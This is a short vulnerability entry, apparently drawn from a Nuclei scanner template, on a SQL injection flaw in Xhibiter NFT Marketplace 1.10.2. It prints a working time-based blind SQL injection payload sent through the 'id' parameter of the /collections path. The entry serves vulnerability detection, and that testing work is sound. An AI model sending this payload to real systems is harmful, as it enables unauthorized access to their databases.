# Vulnerability: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`xhibiter-nft-sqli.yaml`)

## Description
The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable input fields.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
Host: {{Hostname}}
```

